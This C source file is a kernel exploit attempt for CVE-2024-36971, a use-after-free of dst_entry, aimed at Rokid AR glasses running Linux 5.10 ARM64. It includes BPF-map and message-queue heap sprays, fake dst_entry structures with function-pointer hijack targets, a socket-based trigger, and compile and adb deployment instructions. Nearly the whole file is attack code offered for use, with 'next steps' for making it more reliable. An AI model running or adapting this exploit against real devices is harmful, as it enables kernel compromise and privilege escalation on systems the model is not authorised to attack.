/*
 * CVE-2024-36971 BPF Heap Spray for dst_entry Exploitation
 * =========================================================
 *
 * TARGET: Rokid AR Glasses - Linux 5.10.209-perf (ARM64)
 *
 * STRATEGY:
 * ─────────
 * Since CVE-2023-2163 is patched but BPF is still available
 * (unprivileged_bpf_disabled=0), we use BPF maps for heap spray.
 *
 * The ip_dst_cache slab is 192 bytes. We create BPF maps with
 * value_size=192 to allocate objects in the same slab cache,
 * potentially reusing freed dst_entry slots.
 *
 * ATTACK FLOW:
 * ────────────
 * 1. Spray: Create many 192-byte BPF map entries with fake dst_entry
 * 2. Trigger: Use CVE-2024-36971 to free dst_entry via route change
 * 3. Reclaim: Hope BPF map value occupies freed dst_entry slab
 * 4. Hijack: Next dst operation uses our controlled fake structure
 *
 * COMPILE:
 *   aarch64-linux-android31-clang -static -O2 -o cve_2024_36971_bpf_spray cve_2024_36971_bpf_spray.c
 *
 * USAGE:
 *   adb push cve_2024_36971_bpf_spray /data/local/tmp/
 *   adb shell /data/local/tmp/cve_2024_36971_bpf_spray
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <linux/bpf.h>

#ifndef __NR_bpf
#define __NR_bpf 280
#endif

// ═══════════════════════════════════════════════════════════════════════════
// dst_entry Structure Layout for Linux 5.10.x ARM64
// ═══════════════════════════════════════════════════════════════════════════

/*
 * struct dst_entry (192 bytes on ARM64 5.10.x)
 *
 * Offset   Field               Size    Notes
 * ──────────────────────────────────────────────────────────────
 * 0x00     dev                 8       net_device pointer
 * 0x08     ops                 8       dst_ops pointer (★ HIJACK TARGET)
 * 0x10     _metrics            8
 * 0x18     expires             8
 * 0x20     xfrm                8
 * 0x28     input               8       Function pointer (rx)
 * 0x30     output              8       Function pointer (tx)
 * 0x38     flags               2
 * 0x3a     obsolete            2       ★ Must be > 0 for negative_advice
 * 0x3c     header_len          2
 * 0x3e     trailer_len         2
 * 0x40     __refcnt            4       atomic_t
 * 0x44     __use               4
 * 0x48     lastuse             8
 * 0x50     lwtstate            8
 * 0x58     callback_head       16      rcu_head
 * 0x68     error               2
 * 0x6a     __pad               6
 * 0x70     tclassid            4
 * 0x74     __pad2              4
 * ... (more fields up to 192 bytes)
 */

#define DST_ENTRY_SIZE 192

// Key offsets
#define OFF_DEV 0x00
#define OFF_OPS 0x08
#define OFF_INPUT 0x28
#define OFF_OUTPUT 0x30
#define OFF_OBSOLETE 0x3a
#define OFF_REFCNT 0x40

// ═══════════════════════════════════════════════════════════════════════════
// BPF Syscall Interface
// ═══════════════════════════════════════════════════════════════════════════

static inline int bpf_syscall(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

static int bpf_create_map(int type, int key_size, int value_size, int max_entries)
{
    union bpf_attr attr = {
        .map_type = type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries,
    };
    return bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_map(int fd, void *key, void *value, uint64_t flags)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
        .flags = flags,
    };
    return bpf_syscall(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

static int bpf_lookup_map(int fd, void *key, void *value)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
    };
    return bpf_syscall(BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

// ═══════════════════════════════════════════════════════════════════════════
// Fake dst_entry Construction
// ═══════════════════════════════════════════════════════════════════════════

typedef struct
{
    uint64_t dev;                           // 0x00
    uint64_t ops;                           // 0x08 - dst_ops pointer
    uint64_t _metrics;                      // 0x10
    uint64_t expires;                       // 0x18
    uint64_t xfrm;                          // 0x20
    uint64_t input;                         // 0x28 - input function
    uint64_t output;                        // 0x30 - output function
    uint16_t flags;                         // 0x38
    uint16_t obsolete;                      // 0x3a - CRITICAL
    uint16_t header_len;                    // 0x3c
    uint16_t trailer_len;                   // 0x3e
    uint32_t __refcnt;                      // 0x40
    uint32_t __use;                         // 0x44
    uint64_t lastuse;                       // 0x48
    uint64_t lwtstate;                      // 0x50
    uint64_t rcu_head[2];                   // 0x58
    uint16_t error;                         // 0x68
    uint8_t padding[DST_ENTRY_SIZE - 0x6a]; // Fill to 192
} __attribute__((packed)) fake_dst_entry_t;

static void build_fake_dst_entry(fake_dst_entry_t *fake, uint64_t marker)
{
    memset(fake, 0, sizeof(*fake));

    // Magic markers for detection
    fake->dev = 0x4141414141414141ULL;
    fake->ops = marker; // Will be our controlled address if we have info leak
    fake->_metrics = 0x4343434343434343ULL;
    fake->input = 0x4444444444444444ULL;
    fake->output = 0x4545454545454545ULL;

    // Critical values
    fake->obsolete = 2; // > 0 triggers free in negative_advice
    fake->__refcnt = 1; // Keep valid reference
    fake->flags = 0;
    fake->error = 0;
}

// ═══════════════════════════════════════════════════════════════════════════
// Heap Spray via BPF Maps
// ═══════════════════════════════════════════════════════════════════════════

#define SPRAY_MAPS 64       // Number of BPF maps
#define ENTRIES_PER_MAP 256 // Entries per map

typedef struct
{
    int map_fds[SPRAY_MAPS];
    int count;
    int total_entries;
} spray_context_t;

static spray_context_t g_spray = {0};

static int do_bpf_spray(uint64_t marker)
{
    printf("[*] Starting BPF heap spray (192-byte objects)...\n");
    printf("    Target: ip_dst_cache slab (192 bytes)\n");

    fake_dst_entry_t fake;
    build_fake_dst_entry(&fake, marker);

    printf("    Fake dst_entry structure:\n");
    printf("      ops:      0x%016lx\n", fake.ops);
    printf("      obsolete: %d\n", fake.obsolete);
    printf("      refcnt:   %d\n", fake.__refcnt);

    int created = 0;
    int total_entries = 0;

    for (int i = 0; i < SPRAY_MAPS; i++)
    {
        // Create map with value_size = 192 (matches ip_dst_cache)
        int fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(uint32_t),
                                DST_ENTRY_SIZE, ENTRIES_PER_MAP);
        if (fd < 0)
        {
            if (i == 0)
            {
                printf("    [!] Failed to create first map: %s\n", strerror(errno));
                return -1;
            }
            break;
        }

        g_spray.map_fds[i] = fd;
        created++;

        // Fill map with fake dst_entry structures
        for (uint32_t j = 0; j < ENTRIES_PER_MAP; j++)
        {
            // Vary the marker slightly for each entry
            fake.ops = marker + (i * ENTRIES_PER_MAP + j);

            if (bpf_update_map(fd, &j, &fake, 0) == 0)
            {
                total_entries++;
            }
        }

        if ((i + 1) % 16 == 0)
        {
            printf("    Progress: %d maps, %d entries...\n", i + 1, total_entries);
        }
    }

    g_spray.count = created;
    g_spray.total_entries = total_entries;

    printf("    [+] Spray complete!\n");
    printf("        Maps created: %d\n", created);
    printf("        Total 192-byte objects: %d\n", total_entries);
    printf("        Memory allocated: ~%d KB\n", (total_entries * DST_ENTRY_SIZE) / 1024);

    return 0;
}

static void cleanup_spray(void)
{
    for (int i = 0; i < g_spray.count; i++)
    {
        if (g_spray.map_fds[i] >= 0)
        {
            close(g_spray.map_fds[i]);
        }
    }
    g_spray.count = 0;
}

// ═══════════════════════════════════════════════════════════════════════════
// Alternative Spray: msgsnd (more reliable for cross-cache)
// ═══════════════════════════════════════════════════════════════════════════

#define MSG_SPRAY_QUEUES 16
#define MSG_SPRAY_COUNT 64

typedef struct
{
    long mtype;
    char mtext[DST_ENTRY_SIZE - sizeof(long)];
} spray_msg_t;

static int g_msgq_ids[MSG_SPRAY_QUEUES];
static int g_msgq_count = 0;

static int do_msgq_spray(uint64_t marker)
{
    printf("\n[*] Alternative spray via msgsnd (192-byte messages)...\n");

    spray_msg_t msg;
    fake_dst_entry_t *fake = (fake_dst_entry_t *)&msg;

    // Build fake dst_entry inside message
    memset(&msg, 0, sizeof(msg));
    msg.mtype = 1;

    // The message body starts after mtype, so adjust
    fake_dst_entry_t temp;
    build_fake_dst_entry(&temp, marker);
    memcpy(msg.mtext, ((char *)&temp) + sizeof(long), sizeof(msg.mtext));

    int total = 0;

    for (int i = 0; i < MSG_SPRAY_QUEUES; i++)
    {
        int qid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (qid < 0)
        {
            if (i == 0)
            {
                printf("    [!] msgget failed: %s\n", strerror(errno));
                return -1;
            }
            break;
        }

        g_msgq_ids[i] = qid;
        g_msgq_count++;

        for (int j = 0; j < MSG_SPRAY_COUNT; j++)
        {
            msg.mtype = j + 1;
            if (msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT) == 0)
            {
                total++;
            }
        }
    }

    printf("    [+] Message queues: %d, Messages: %d\n", g_msgq_count, total);
    return 0;
}

static void cleanup_msgq(void)
{
    for (int i = 0; i < g_msgq_count; i++)
    {
        msgctl(g_msgq_ids[i], IPC_RMID, NULL);
    }
    g_msgq_count = 0;
}

// ═══════════════════════════════════════════════════════════════════════════
// CVE-2024-36971 Trigger via Route Manipulation
// ═══════════════════════════════════════════════════════════════════════════

static int create_tcp_connection(const char *target_ip, int port)
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        return -1;
    }

    // Set SO_LINGER for immediate RST on close
    struct linger ling = {.l_onoff = 1, .l_linger = 0};
    setsockopt(sock, SOL_SOCKET, SO_LINGER, &ling, sizeof(ling));

    // Non-blocking
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(port),
    };
    inet_pton(AF_INET, target_ip, &addr.sin_addr);

    // Attempt connection (will likely fail but establishes route)
    connect(sock, (struct sockaddr *)&addr, sizeof(addr));

    return sock;
}

typedef struct
{
    int sockets[256];
    int count;
} socket_pool_t;

static socket_pool_t g_pool = {0};

static int create_socket_pool(const char *target_ip, int count)
{
    printf("[*] Creating socket pool for route manipulation...\n");

    for (int i = 0; i < count && i < 256; i++)
    {
        int port = 10000 + (i % 1000);
        int sock = create_tcp_connection(target_ip, port);
        if (sock >= 0)
        {
            g_pool.sockets[g_pool.count++] = sock;
        }
    }

    printf("    [+] Created %d sockets\n", g_pool.count);
    return g_pool.count;
}

static void trigger_negative_advice(void)
{
    printf("[*] Triggering route invalidation (dst_negative_advice path)...\n");

    /*
     * CVE-2024-36971 Trigger:
     *
     * 1. Socket has cached dst_entry
     * 2. ICMP error or route change marks dst->obsolete > 0
     * 3. tcp_v4_err() or similar calls dst_negative_advice()
     * 4. __dst_negative_advice() frees dst if obsolete > 0
     * 5. Socket still holds reference to freed dst = UAF!
     *
     * On loopback this doesn't work (no real ICMP), but with
     * external IP or specific route manipulation it can trigger.
     */

    // Try to trigger via rapid close with RST
    for (int i = 0; i < g_pool.count; i++)
    {
        // Close with RST (SO_LINGER was set to 0)
        close(g_pool.sockets[i]);
        g_pool.sockets[i] = -1;
    }
    g_pool.count = 0;

    printf("    [+] Closed all sockets with RST\n");
}

// ═══════════════════════════════════════════════════════════════════════════
// Kernel Oops Detection
// ═══════════════════════════════════════════════════════════════════════════

static int check_for_crash(void)
{
    // Check dmesg for recent oops
    FILE *fp = popen("dmesg | tail -20 | grep -i 'oops\\|bug\\|rcu\\|uaf\\|slab' 2>/dev/null", "r");
    if (!fp)
        return 0;

    char buf[256];
    int found = 0;

    while (fgets(buf, sizeof(buf), fp))
    {
        printf("    DMESG: %s", buf);
        found = 1;
    }

    pclose(fp);
    return found;
}

// ═══════════════════════════════════════════════════════════════════════════
// Main Exploit Attempt
// ═══════════════════════════════════════════════════════════════════════════

static void print_banner(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════════╗\n");
    printf("║  CVE-2024-36971 dst_entry UAF + BPF Heap Spray                        ║\n");
    printf("║  ─────────────────────────────────────────────────────────────────    ║\n");
    printf("║  Target: Rokid AR Glasses - Linux 5.10.209 ARM64                      ║\n");
    printf("║  Method: BPF map 192-byte spray + route manipulation                  ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════════╝\n\n");
}

static void check_kernel_info(void)
{
    printf("[*] Kernel Information:\n");

    FILE *fp = fopen("/proc/version", "r");
    if (fp)
    {
        char buf[256];
        if (fgets(buf, sizeof(buf), fp))
        {
            printf("    %s", buf);
        }
        fclose(fp);
    }

    // Check slabinfo for ip_dst_cache (may need root)
    fp = fopen("/proc/slabinfo", "r");
    if (fp)
    {
        char buf[256];
        while (fgets(buf, sizeof(buf), fp))
        {
            if (strstr(buf, "ip_dst_cache") || strstr(buf, "dst_cache"))
            {
                printf("    Slab: %s", buf);
            }
        }
        fclose(fp);
    }
    else
    {
        printf("    [!] Cannot read /proc/slabinfo (need root)\n");
    }

    printf("    UID=%d EUID=%d\n", getuid(), geteuid());
}

int main(int argc, char **argv)
{
    print_banner();
    check_kernel_info();

    // Target IP - use a real external IP for route caching
    // Google DNS is a good choice as it's always reachable
    const char *target_ip = "8.8.8.8";

    if (argc > 1)
    {
        target_ip = argv[1];
    }

    printf("\n[*] Target IP for route establishment: %s\n", target_ip);

    // ═══════════════════════════════════════════════════════════════════
    // PHASE 1: Pre-spray to warm up slab allocator
    // ═══════════════════════════════════════════════════════════════════
    printf("\n"
           "═══════════════════════════════════════════════════════════════════════\n");
    printf("                    PHASE 1: HEAP PREPARATION\n");
    printf("═══════════════════════════════════════════════════════════════════════\n\n");

    // First spray to fragment heap
    printf("[*] Initial spray to fragment heap...\n");
    if (do_bpf_spray(0xDEADBEEF00000000ULL) < 0)
    {
        printf("    [!] BPF spray failed!\n");
        return 1;
    }

    // Also try message queue spray
    do_msgq_spray(0xCAFEBABE00000000ULL);

    // ═══════════════════════════════════════════════════════════════════
    // PHASE 2: Create sockets with dst_entry cache
    // ═══════════════════════════════════════════════════════════════════
    printf("\n"
           "═══════════════════════════════════════════════════════════════════════\n");
    printf("                    PHASE 2: DST_ENTRY CREATION\n");
    printf("═══════════════════════════════════════════════════════════════════════\n\n");

    if (create_socket_pool(target_ip, 64) == 0)
    {
        printf("    [!] Failed to create socket pool\n");
    }

    // Small delay for route establishment
    usleep(100000); // 100ms

    // ═══════════════════════════════════════════════════════════════════
    // PHASE 3: Trigger potential UAF
    // ═══════════════════════════════════════════════════════════════════
    printf("\n"
           "═══════════════════════════════════════════════════════════════════════\n");
    printf("                    PHASE 3: UAF TRIGGER ATTEMPT\n");
    printf("═══════════════════════════════════════════════════════════════════════\n\n");

    trigger_negative_advice();

    // ═══════════════════════════════════════════════════════════════════
    // PHASE 4: Post-spray to reclaim freed slabs
    // ═══════════════════════════════════════════════════════════════════
    printf("\n"
           "═══════════════════════════════════════════════════════════════════════\n");
    printf("                    PHASE 4: SLAB RECLAMATION\n");
    printf("═══════════════════════════════════════════════════════════════════════\n\n");

    // Additional spray to potentially reclaim freed dst_entry slots
    printf("[*] Additional spray to reclaim freed slabs...\n");

    // Create more BPF maps
    for (int round = 0; round < 3; round++)
    {
        int fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(uint32_t),
                                DST_ENTRY_SIZE, 1024);
        if (fd >= 0)
        {
            fake_dst_entry_t fake;
            build_fake_dst_entry(&fake, 0x4242424242420000ULL + round);

            for (uint32_t i = 0; i < 1024; i++)
            {
                bpf_update_map(fd, &i, &fake, 0);
            }
            printf("    Round %d: Sprayed 1024 entries\n", round + 1);
            close(fd);
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    // PHASE 5: Check for success/crash
    // ═══════════════════════════════════════════════════════════════════
    printf("\n"
           "═══════════════════════════════════════════════════════════════════════\n");
    printf("                    PHASE 5: RESULT ANALYSIS\n");
    printf("═══════════════════════════════════════════════════════════════════════\n\n");

    printf("[*] Checking for kernel anomalies...\n");
    usleep(100000); // Wait for any delayed effects

    if (check_for_crash())
    {
        printf("\n    [!!!] POTENTIAL CRASH/BUG DETECTED!\n");
        printf("    [!!!] This indicates the UAF may have triggered!\n");
    }
    else
    {
        printf("    [OK] No immediate crash detected\n");
        printf("    [*] Note: UAF may be silent without proper reclaim\n");
    }

    // ═══════════════════════════════════════════════════════════════════
    // Summary
    // ═══════════════════════════════════════════════════════════════════
    printf("\n"
           "═══════════════════════════════════════════════════════════════════════\n");
    printf("                         EXPLOIT SUMMARY\n");
    printf("═══════════════════════════════════════════════════════════════════════\n\n");

    printf("    BPF Maps Created:     %d\n", g_spray.count);
    printf("    192-byte Objects:     %d\n", g_spray.total_entries);
    printf("    Message Queues:       %d\n", g_msgq_count);
    printf("    Sockets Created:      (closed for trigger)\n");
    printf("\n");
    printf("    ┌───────────────────────────────────────────────────────────────┐\n");
    printf("    │  NEXT STEPS:                                                  │\n");
    printf("    │  1. Monitor dmesg for delayed crashes                         │\n");
    printf("    │  2. Try with different target IPs                             │\n");
    printf("    │  3. Increase spray count if no effect                         │\n");
    printf("    │  4. Consider route table manipulation (needs CAP_NET_ADMIN)   │\n");
    printf("    └───────────────────────────────────────────────────────────────┘\n");

    // Cleanup
    cleanup_spray();
    cleanup_msgq();

    printf("\n[*] Exploit attempt complete.\n");
    return 0;
}
